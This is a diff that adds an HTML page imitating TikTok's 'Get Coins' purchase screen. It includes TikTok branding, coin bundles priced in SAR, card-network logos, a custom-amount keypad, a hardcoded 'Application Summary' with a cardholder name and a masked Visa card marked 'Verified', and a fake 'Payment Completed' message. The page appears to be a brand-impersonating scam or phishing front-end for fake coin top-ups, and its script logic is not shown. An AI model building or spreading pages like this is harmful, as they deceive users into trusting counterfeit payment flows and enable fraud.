@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no">
+    <title data-i18n="title">Get Coins</title>
+    <link type="text/css" rel="stylesheet" href="../css/getcoins.css">
+    <script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/jquery/2.1.3/jquery.min.js"></script>
+    <script src="../js/translations.js" defer></script>
+    <script type="text/javascript" src="../js/getcoins.js" defer></script>
+</head>
+
+<body>
+
+    <header class="top-bar">
+        <div class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 118 42" width="118" height="42"
+                alt="TikTok">
+                <path fill="#25F4EE"
+                    d="M9.875 16.842v-1.119A8.836 8.836 0 008.7 15.64c-4.797-.006-8.7 3.9-8.7 8.707a8.706 8.706 0 003.718 7.135A8.675 8.675 0 011.38 25.55c0-4.737 3.794-8.598 8.495-8.707z">
+                </path>
+                <path fill="#25F4EE"
+                    d="M10.086 29.526c2.14 0 3.89-1.707 3.967-3.83l.006-18.968h3.463a6.78 6.78 0 01-.11-1.202h-4.726l-.006 18.969a3.978 3.978 0 01-3.967 3.829 3.93 3.93 0 01-1.846-.46 3.949 3.949 0 003.22 1.662zM23.992 13.166v-1.055a6.506 6.506 0 01-3.583-1.068 6.571 6.571 0 003.583 2.123z">
+                </path>
+                <path fill="#FE2C55"
+                    d="M20.409 11.043a6.54 6.54 0 01-1.616-4.315h-1.265a6.557 6.557 0 002.88 4.316zM8.706 20.365a3.98 3.98 0 00-3.973 3.976c0 1.528.869 2.858 2.134 3.523a3.936 3.936 0 01-.754-2.321 3.98 3.98 0 013.973-3.976c.409 0 .805.07 1.175.185v-4.833a8.837 8.837 0 00-1.175-.083c-.07 0-.134.006-.204.006v3.708a3.999 3.999 0 00-1.176-.185z">
+                </path>
+                <path fill="#FE2C55"
+                    d="M23.992 13.166v3.676c-2.453 0-4.727-.786-6.58-2.116v9.621c0 4.802-3.902 8.714-8.706 8.714a8.669 8.669 0 01-4.988-1.579 8.69 8.69 0 006.368 2.781c4.797 0 8.707-3.906 8.707-8.714v-9.621a11.25 11.25 0 006.579 2.116v-4.73c-.48 0-.94-.052-1.38-.148z">
+                </path>
+                <path fill="black"
+                    d="M17.413 24.348v-9.622a11.251 11.251 0 006.58 2.116v-3.676a6.571 6.571 0 01-3.584-2.123 6.61 6.61 0 01-2.888-4.315H14.06l-.006 18.968a3.978 3.978 0 01-3.967 3.83A3.99 3.99 0 016.86 27.87a3.991 3.991 0 01-2.133-3.523A3.98 3.98 0 018.7 20.372c.409 0 .805.07 1.175.185v-3.708c-4.701.103-8.495 3.964-8.495 8.701 0 2.29.888 4.373 2.338 5.933a8.669 8.669 0 004.988 1.58c4.798 0 8.707-3.913 8.707-8.714zM30.048 13.179h14.774l-1.354 4.232h-3.832v15.644h-4.778V17.41l-4.804.006-.006-4.238zM69.032 13.179h15.12l-1.355 4.232h-4.17v15.644h-4.785V17.41l-4.804.006-.006-4.238zM45.73 19.502h4.733v13.553h-4.708l-.026-13.553zM52.347 13.128h4.733v9.257l4.689-4.61h5.646l-5.934 5.76 6.644 9.52h-5.213l-4.433-6.598-1.405 1.362v5.236H52.34V13.128h.006zM102.49 13.128h4.734v9.257l4.688-4.61h5.647l-5.934 5.76 6.643 9.52h-5.206l-4.433-6.598-1.405 1.362v5.236h-4.734V13.128zM48.093 17.954a2.384 2.384 0 002.382-2.384 2.384 2.384 0 10-2.382 2.384z">
+                </path>
+                <path fill="#25F4EE"
+                    d="M83.544 24.942a8.112 8.112 0 017.474-8.087 8.748 8.748 0 00-.709-.026c-4.478 0-8.106 3.631-8.106 8.113 0 4.482 3.628 8.113 8.106 8.113.21 0 .498-.013.71-.026-4.178-.326-7.475-3.823-7.475-8.087z">
+                </path>
+                <path fill="#FE2C55"
+                    d="M92.858 16.83c-.217 0-.505.012-.716.025a8.111 8.111 0 017.468 8.087 8.112 8.112 0 01-7.468 8.087c.211.02.499.026.716.026 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z">
+                </path>
+                <path fill="black"
+                    d="M91.58 28.887a3.94 3.94 0 01-3.94-3.945 3.94 3.94 0 117.882 0c0 2.18-1.77 3.945-3.942 3.945zm0-12.058c-4.477 0-8.106 3.631-8.106 8.113 0 4.482 3.629 8.113 8.106 8.113 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z">
+                </path>
+            </svg>
+        </div>
+        <div class="search-bar">
+            <input type="text" placeholder="Search">
+            <button class="search-button">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <circle cx="11" cy="11" r="8"></circle>
+                    <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+                </svg>
+            </button>
+        </div>
+        <div class="right-section">
+            <div class="hide">
+                <button class="upload-button">
+                    <svg t="1729389312218" class="icon" viewBox="0 0 1024 1024" width="25" height="17" version="1.1"
+                        xmlns="http://www.w3.org/2000/svg" p-id="1643">
+                        <path
+                            d="M512 128c11.2 0 20.8 9.6 22.4 20.8v340.8h339.2c12.8 0 22.4 9.6 22.4 22.4 0 11.2-9.6 20.8-20.8 22.4H534.4v339.2c0 12.8-9.6 22.4-22.4 22.4-11.2 0-20.8-9.6-22.4-20.8V534.4H150.4c-12.8 0-22.4-9.6-22.4-22.4 0-11.2 9.6-20.8 20.8-22.4h340.8V150.4c0-12.8 9.6-22.4 22.4-22.4z"
+                            fill="#222222" p-id="1644"></path>
+                    </svg>
+                    <span data-i18n="upload">Upload</span>
+                </button>
+            </div>
+            <button class="login-button" data-i18n="login">Log in</button>
+            <button class="menu-button">
+                <span></span>
+                <span></span>
+                <span></span>
+            </button>
+
+            <!-- 语言选择弹窗 -->
+            <div id="language-modal" class="modal-language">
+                <div class="modal-content-language">
+                    <h3 data-i18n="choose_language">Choose Language</h3>
+                    <ul id="language-list"></ul>
+                    <button id="close-modal" data-i18n="close">Close</button>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <div class="container">
+
+        <div class="name-box">
+            <h2 class="name" data-i18n="get_coins">Get Coins</h2>
+            <div style="cursor: pointer;" data-i18n="view_transaction">view transaction history</div>
+        </div>
+        <div class="inputName">
+            <input type="text" id="inputField" placeholder="" data-i18n-placeholder="enter_username">
+            <span id="clearButton" class="clear-icon">
+                <!-- SVG × 图标 -->
+                <!-- <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
+                    class="icon">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
+                </svg> -->
+                <svg t="1729390778379" class="icon" viewBox="0 0 1024 1024" version="1.1"
+                    xmlns="http://www.w3.org/2000/svg" p-id="3470" width="15" height="15">
+                    <path
+                        d="M519.656727 472.459636l-160.512-160.488727a36.584727 36.584727 0 1 0-51.712 51.712l160.488728 160.512-160.488728 160.512a36.584727 36.584727 0 1 0 51.712 51.712l160.512-160.512 160.488728 160.512a36.584727 36.584727 0 1 0 51.735272-51.712l-160.512-160.512 160.512-160.512a36.584727 36.584727 0 1 0-51.735272-51.712L519.68 472.436364zM512 1024C229.236364 1024 0 794.763636 0 512S229.236364 0 512 0s512 229.236364 512 512-229.236364 512-512 512z"
+                        fill="#888888" p-id="3471"></path>
+                </svg>
+            </span>
+        </div>
+
+        <div class="coinsBar">
+            <div class="recharge" data-i18n="recharge">Send</div>
+        </div>
+
+        <div class="coin-options">
+
+            <div class="coin-option active" data-coins="70" data-price="119">
+
+                <div>
+                    <svg font-size="16px" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg"
+                        width="1em" height="1em" style="transform: rotateY(180deg);">
+                        <circle cx="24" cy="24" r="22" fill="#FBD32C"></circle>
+                        <circle cx="24" cy="24" r="17" fill="#F9BA10"></circle>
+                        <path d="M40.93 25.5a17 17 0 1 0-33.87 0 17 17 0 0 1 33.87 0Z" fill="#F6A811"></path>
+                        <path
+                            d="M33 19a5.03 5.03 0 0 1-5.06-5h-3.38v13.61a3.07 3.07 0 0 1-3.1 3.06c-1.7 0-3.09-1.37-3.09-3.06a3.07 3.07 0 0 1 3.94-2.94v-3.4A6.43 6.43 0 0 0 15 27.6c0 3.54 2.9 6.4 6.47 6.4a6.43 6.43 0 0 0 6.47-6.39v-6.94A8.47 8.47 0 0 0 33 22.33V19Z"
+                            fill="#fff"></path>
+                    </svg>
+                    <strong>70</strong>
+                    <div class="price">SAR$26</div>
+                </div>
+            </div>
+            <div class="coin-option" data-coins="350" data-price="595">
+
+                <div>
+                    <svg font-size="16px" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg"
+                        width="1em" height="1em" style="transform: rotateY(180deg);">
+                        <circle cx="24" cy="24" r="22" fill="#FBD32C"></circle>
+                        <circle cx="24" cy="24" r="17" fill="#F9BA10"></circle>
+                        <path d="M40.93 25.5a17 17 0 1 0-33.87 0 17 17 0 0 1 33.87 0Z" fill="#F6A811"></path>
+                        <path
+                            d="M33 19a5.03 5.03 0 0 1-5.06-5h-3.38v13.61a3.07 3.07 0 0 1-3.1 3.06c-1.7 0-3.09-1.37-3.09-3.06a3.07 3.07 0 0 1 3.94-2.94v-3.4A6.43 6.43 0 0 0 15 27.6c0 3.54 2.9 6.4 6.47 6.4a6.43 6.43 0 0 0 6.47-6.39v-6.94A8.47 8.47 0 0 0 33 22.33V19Z"
+                            fill="#fff"></path>
+                    </svg>
+                    <strong>350</strong>
+                    <div class="price">SAR$129</div>
+                </div>
+            </div>
+            <div class="coin-option" data-coins="700" data-price="1189">
+                <div>
+                    <svg font-size="16px" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg"
+                        width="1em" height="1em" style="transform: rotateY(180deg);">
+                        <circle cx="24" cy="24" r="22" fill="#FBD32C"></circle>
+                        <circle cx="24" cy="24" r="17" fill="#F9BA10"></circle>
+                        <path d="M40.93 25.5a17 17 0 1 0-33.87 0 17 17 0 0 1 33.87 0Z" fill="#F6A811"></path>
+                        <path
+                            d="M33 19a5.03 5.03 0 0 1-5.06-5h-3.38v13.61a3.07 3.07 0 0 1-3.1 3.06c-1.7 0-3.09-1.37-3.09-3.06a3.07 3.07 0 0 1 3.94-2.94v-3.4A6.43 6.43 0 0 0 15 27.6c0 3.54 2.9 6.4 6.47 6.4a6.43 6.43 0 0 0 6.47-6.39v-6.94A8.47 8.47 0 0 0 33 22.33V19Z"
+                            fill="#fff"></path>
+                    </svg>
+                    <strong>700</strong>
+                    <div class="price">SAR$259</div>
+                </div>
+            </div>
+            <div class="coin-option" data-coins="1400" data-price="2375">
+                <div>
+                    <svg font-size="16px" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg"
+                        width="1em" height="1em" style="transform: rotateY(180deg);">
+                        <circle cx="24" cy="24" r="22" fill="#FBD32C"></circle>
+                        <circle cx="24" cy="24" r="17" fill="#F9BA10"></circle>
+                        <path d="M40.93 25.5a17 17 0 1 0-33.87 0 17 17 0 0 1 33.87 0Z" fill="#F6A811"></path>
+                        <path
+                            d="M33 19a5.03 5.03 0 0 1-5.06-5h-3.38v13.61a3.07 3.07 0 0 1-3.1 3.06c-1.7 0-3.09-1.37-3.09-3.06a3.07 3.07 0 0 1 3.94-2.94v-3.4A6.43 6.43 0 0 0 15 27.6c0 3.54 2.9 6.4 6.47 6.4a6.43 6.43 0 0 0 6.47-6.39v-6.94A8.47 8.47 0 0 0 33 22.33V19Z"
+                            fill="#fff"></path>
+                    </svg>
+                    <strong>1,400</strong>
+                    <div class="price">SAR$519</div>
+                </div>
+            </div>
+            <div class="coin-option" data-coins="3500" data-price="5939">
+
+                <div>
+                    <svg font-size="16px" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg"
+                        width="1em" height="1em" style="transform: rotateY(180deg);">
+                        <circle cx="24" cy="24" r="22" fill="#FBD32C"></circle>
+                        <circle cx="24" cy="24" r="17" fill="#F9BA10"></circle>
+                        <path d="M40.93 25.5a17 17 0 1 0-33.87 0 17 17 0 0 1 33.87 0Z" fill="#F6A811"></path>
+                        <path
+                            d="M33 19a5.03 5.03 0 0 1-5.06-5h-3.38v13.61a3.07 3.07 0 0 1-3.1 3.06c-1.7 0-3.09-1.37-3.09-3.06a3.07 3.07 0 0 1 3.94-2.94v-3.4A6.43 6.43 0 0 0 15 27.6c0 3.54 2.9 6.4 6.47 6.4a6.43 6.43 0 0 0 6.47-6.39v-6.94A8.47 8.47 0 0 0 33 22.33V19Z"
+                            fill="#fff"></path>
+                    </svg>
+                    <strong>3,500</strong>
+                    <div class="price">SAR$1299</div>
+                </div>
+            </div>
+            <div class="coin-option" data-coins="7000" data-price="11879">
+                <div>
+                    <svg font-size="16px" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg"
+                        width="1em" height="1em" style="transform: rotateY(180deg);">
+                        <circle cx="24" cy="24" r="22" fill="#FBD32C"></circle>
+                        <circle cx="24" cy="24" r="17" fill="#F9BA10"></circle>
+                        <path d="M40.93 25.5a17 17 0 1 0-33.87 0 17 17 0 0 1 33.87 0Z" fill="#F6A811"></path>
+                        <path
+                            d="M33 19a5.03 5.03 0 0 1-5.06-5h-3.38v13.61a3.07 3.07 0 0 1-3.1 3.06c-1.7 0-3.09-1.37-3.09-3.06a3.07 3.07 0 0 1 3.94-2.94v-3.4A6.43 6.43 0 0 0 15 27.6c0 3.54 2.9 6.4 6.47 6.4a6.43 6.43 0 0 0 6.47-6.39v-6.94A8.47 8.47 0 0 0 33 22.33V19Z"
+                            fill="#fff"></path>
+                    </svg>
+                    <strong>7,000</strong>
+                    <div class="price">SAR$2,595</div>
+                </div>
+            </div>
+            <div class="coin-option" data-coins="17500" data-price="29695">
+                <div>
+                    <svg font-size="16px" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg"
+                        width="1em" height="1em" style="transform: rotateY(180deg);">
+                        <circle cx="24" cy="24" r="22" fill="#FBD32C"></circle>
+                        <circle cx="24" cy="24" r="17" fill="#F9BA10"></circle>
+                        <path d="M40.93 25.5a17 17 0 1 0-33.87 0 17 17 0 0 1 33.87 0Z" fill="#F6A811"></path>
+                        <path
+                            d="M33 19a5.03 5.03 0 0 1-5.06-5h-3.38v13.61a3.07 3.07 0 0 1-3.1 3.06c-1.7 0-3.09-1.37-3.09-3.06a3.07 3.07 0 0 1 3.94-2.94v-3.4A6.43 6.43 0 0 0 15 27.6c0 3.54 2.9 6.4 6.47 6.4a6.43 6.43 0 0 0 6.47-6.39v-6.94A8.47 8.47 0 0 0 33 22.33V19Z"
+                            fill="#fff"></path>
+                    </svg>
+                    <strong>17,500</strong>
+                    <div class="price">SAR$6,489</div>
+                </div>
+            </div>
+            <div class="coin-option" id="custom-option" onclick="showPop()">
+
+                <div>
+                    <svg font-size="16px" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg"
+                        width="1em" height="1em" style="transform: rotateY(180deg);">
+                        <circle cx="24" cy="24" r="22" fill="#FBD32C"></circle>
+                        <circle cx="24" cy="24" r="17" fill="#F9BA10"></circle>
+                        <path d="M40.93 25.5a17 17 0 1 0-33.87 0 17 17 0 0 1 33.87 0Z" fill="#F6A811"></path>
+                        <path
+                            d="M33 19a5.03 5.03 0 0 1-5.06-5h-3.38v13.61a3.07 3.07 0 0 1-3.1 3.06c-1.7 0-3.09-1.37-3.09-3.06a3.07 3.07 0 0 1 3.94-2.94v-3.4A6.43 6.43 0 0 0 15 27.6c0 3.54 2.9 6.4 6.47 6.4a6.43 6.43 0 0 0 6.47-6.39v-6.94A8.47 8.47 0 0 0 33 22.33V19Z"
+                            fill="#fff"></path>
+                    </svg>
+                    <strong data-i18n="custom">Custom</strong>
+
+                    <!-- <div class="price">large amount Supported</div> -->
+                </div>
+            </div>
+        </div>
+
+        <div class="payBox">
+            <img src="../imgs/visa.png" alt="">
+            <img src="../imgs/mastercard.png" alt="">
+            <img src="../imgs/card_american_express.png" alt="">
+            <img src="../imgs/card_jcb.png" alt="">
+            <img src="../imgs/diners.png" alt="">
+            <img src="../imgs/venmoicon.png" alt="">
+            <img src="../imgs/paypal-light.png" alt="">
+        </div>
+
+    </div>
+
+    <div class="footer">
+        <!-- <div class="left" data-i18n="total">Total</div>
+        <div class="right" id="buyButton">SAR$ 26</div> -->
+        <button class="buy-button" data-i18n="recharge">Recharge</button>
+    </div>
+
+
+    <!-- 输入金额 -->
+    <div id="pop" onclick="hidePop()"></div>
+    <div class="show-box">
+        <div class="showcontainer">
+            <header class="showheader">
+                <button class="back-button" onclick="hidePop()">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+                        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M19 12H5M12 19l-7-7 7-7" />
+                    </svg>
+                </button>
+                <h1 data-i18n="custom">Custom</h1>
+                <button class="help-button">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+                        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="10"></circle>
+                        <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path>
+                        <line x1="12" y1="17" x2="12.01" y2="17"></line>
+                    </svg>
+                </button>
+            </header>
+            <main>
+                <div class="input-container">
+                    <label for="coinInput" style="color: #000;">
+                        <span data-i18n="number_of_coins">Number of Coins</span>
+                        <img style="width: 15px;" src="../imgs/down.png" alt="">
+                    </label>
+
+                    <div class="input-wrapper">
+                        <svg font-size="16px" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg"
+                            width="1em" height="1em" style="transform: rotateY(180deg);">
+                            <circle cx="24" cy="24" r="22" fill="#FBD32C"></circle>
+                            <circle cx="24" cy="24" r="17" fill="#F9BA10"></circle>
+                            <path d="M40.93 25.5a17 17 0 1 0-33.87 0 17 17 0 0 1 33.87 0Z" fill="#F6A811"></path>
+                            <path
+                                d="M33 19a5.03 5.03 0 0 1-5.06-5h-3.38v13.61a3.07 3.07 0 0 1-3.1 3.06c-1.7 0-3.09-1.37-3.09-3.06a3.07 3.07 0 0 1 3.94-2.94v-3.4A6.43 6.43 0 0 0 15 27.6c0 3.54 2.9 6.4 6.47 6.4a6.43 6.43 0 0 0 6.47-6.39v-6.94A8.47 8.47 0 0 0 33 22.33V19Z"
+                                fill="#fff"></path>
+                        </svg>
+                        <input type="text" id="coinInput" readonly placeholder="30 - 2,500,000">
+                    </div>
+                </div>
+                <div class="keypad">
+                    <button class="key">1</button>
+                    <button class="key">2</button>
+                    <button class="key">3</button>
+                    <button class="key backspace">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path>
+                            <line x1="18" y1="9" x2="12" y2="15"></line>
+                            <line x1="12" y1="9" x2="18" y2="15"></line>
+                        </svg>
+                    </button>
+                    <button class="key">4</button>
+                    <button class="key">5</button>
+                    <button class="key">6</button>
+                    <button class="key">000</button>
+                    <button class="key">7</button>
+                    <button class="key">8</button>
+                    <button class="key">9</button>
+                    <button class="key">0</button>
+                </div>
+                <div class="total">
+                    <span data-i18n="total">Total</span>
+                    <span id="totalAmount">SAR$0</span>
+                </div>
+
+                <div>
+                    <button id="rechargeButton" disabled>
+                        <svg fill="currentColor" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" width="1em"
+                            height="1em">
+                            <path
+                                d="M28.22 13.7a4.83 4.83 0 0 0 4.86 4.8l-.04 3.45c-1.77 0-3.4-.53-4.75-1.43l-.09 6.99a6.64 6.64 0 0 1-6.69 6.3 6.44 6.44 0 0 1-6.53-6.45 6.63 6.63 0 0 1 7.61-6.4l-.04 3.7a2.97 2.97 0 0 0-3.88 2.7 2.85 2.85 0 0 0 2.89 2.85 2.93 2.93 0 0 0 2.96-2.85l.16-13.66h3.54Z">
+                            </path>
+                            <path
+                                d="M5 23.15V10.5c0-1.2 1.06-2.17 2.26-2.28 3.05-.25 8.87-1.52 15.34-6.99.8-.67 2-.67 2.8 0 6.46 5.46 12.28 6.74 15.34 7 1.2.1 2.26 1.07 2.26 2.27v12.65c0 14.13-14.77 21.8-18.27 23.43-.47.22-1 .22-1.47 0C19.76 44.96 5 37.28 5 23.15Zm4-11.1v11.1c0 5.57 2.88 10.04 6.56 13.5 3.1 2.91 6.5 4.86 8.44 5.85a37.07 37.07 0 0 0 8.43-5.85C36.11 33.2 39 28.72 39 23.15V12.04c-3.65-.53-9.1-2.16-15-6.8-5.91 4.64-11.35 6.27-15 6.8Z">
+                            </path>
+                        </svg>
+                        <strong data-i18n="recharge">Send</strong>
+
+                    </button>
+                </div>
+            </main>
+
+        </div>
+    </div>
+
+    <!-- 充值加载中 -->
+    <div class="load-box">
+        <iframe width="100" height="70" scrolling="no" frameborder="0" src="./loader.html" frameborder="0" style="margin-top: -15px;"></iframe>
+        <!-- <div class="load-text">
+            <iframe width="100" height="70" scrolling="no" frameborder="0" src="./loader.html" frameborder="0"></iframe>
+            <h3 data-i18n="processing_payment">Processing your payment</h3>
+            <p style="font-size:18px;color:#aaa;" data-i18n="few_seconds">This could take few seconds</p>
+            <p style="color:#aaa;" id="timeLeft">05:00</p>
+        </div> -->
+    </div>
+
+    <!-- 充值加载version2 -->
+    <div class="load-box-2">
+
+        <header class="showheader">
+            <button class="back-button" onclick="hidePop()">
+                <p style="font-size: 30px;margin: 0;">×</p>
+            </button>
+            <h1 style="font-size: 20px;color: #000;" data-i18n="application_summary">Application Summary</h1>
+            <button class="help-button">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <circle cx="12" cy="12" r="10"></circle>
+                    <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path>
+                    <line x1="12" y1="17" x2="12.01" y2="17"></line>
+                </svg>
+            </button>
+        </header>
+
+        <main>
+            <div>
+                <p class="load-left" data-i18n="cardholder_name">Cardholder's name:</p>
+                <p class="load-right">Alu Alhab Tnari</p>
+            </div>
+            <div>
+                <p class="load-left" data-i18n="currency">Currency:</p>
+                <p class="load-right"><span id="coinsNum_1">0</span></p>
+            </div>
+            <div>
+                <p class="load-left" data-i18n="currency_rate">Currency rate:</p>
+                <p class="load-right"><span id="coinsPrice_1">0</span></p>
+            </div>
+            <div>
+                <p class="load-left" data-i18n="payment_method">Payment method:</p>
+            </div>
+            <div>
+                <img class="load-left" style="width: 50px;margin: 5px 5px 0 0;" src="../imgs/visa.png" alt="">
+                <p class="load-left">**********6621</p>
+                <p class="load-right" data-i18n="verified">Verified</p>
+            </div>
+            <div>
+                <p class="load-left" data-i18n="total">Total</p>
+                <p class="load-right"><span id="coinsPrice_2">0</span></p>
+            </div>
+
+            <div>
+                <button id="ConfirmButton">
+                    <svg fill="currentColor" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" width="1em"
+                        height="1em">
+                        <path
+                            d="M28.22 13.7a4.83 4.83 0 0 0 4.86 4.8l-.04 3.45c-1.77 0-3.4-.53-4.75-1.43l-.09 6.99a6.64 6.64 0 0 1-6.69 6.3 6.44 6.44 0 0 1-6.53-6.45 6.63 6.63 0 0 1 7.61-6.4l-.04 3.7a2.97 2.97 0 0 0-3.88 2.7 2.85 2.85 0 0 0 2.89 2.85 2.93 2.93 0 0 0 2.96-2.85l.16-13.66h3.54Z">
+                        </path>
+                        <path
+                            d="M5 23.15V10.5c0-1.2 1.06-2.17 2.26-2.28 3.05-.25 8.87-1.52 15.34-6.99.8-.67 2-.67 2.8 0 6.46 5.46 12.28 6.74 15.34 7 1.2.1 2.26 1.07 2.26 2.27v12.65c0 14.13-14.77 21.8-18.27 23.43-.47.22-1 .22-1.47 0C19.76 44.96 5 37.28 5 23.15Zm4-11.1v11.1c0 5.57 2.88 10.04 6.56 13.5 3.1 2.91 6.5 4.86 8.44 5.85a37.07 37.07 0 0 0 8.43-5.85C36.11 33.2 39 28.72 39 23.15V12.04c-3.65-.53-9.1-2.16-15-6.8-5.91 4.64-11.35 6.27-15 6.8Z">
+                        </path>
+                    </svg>
+                    <strong data-i18n="confirm">Confirm</strong>
+
+                </button>
+            </div>
+        </main>
+    </div>
+
+
+    <!-- 充值成功 -->
+    <div class="success-box">
+        <div class="success-text">
+            <div class="suc-circle">
+                <img src="../imgs/success.png" alt="">
+            </div>
+
+            <h3 data-i18n="payment_completed">Payment Completed</h3>
+            <p style="text-align: center;font-size:16px;color:#aaa;">
+                <span data-i18n="top_up">You top up</span> <span id="coinsNum">0</span> <span data-i18n="coins_to">coins
+                    to</span> <span id="userName">user</span>, <span data-i18n="send_gifts">and you can use the coins to
+                    send virtual gifts, 24hr-arrival</span>
+            </p>
+            <button class="backBtn" onclick="hidePop()" data-i18n="go_back">Go back</button>
+        </div>
+    </div>
+
+
+
+</body>
+
+</html>
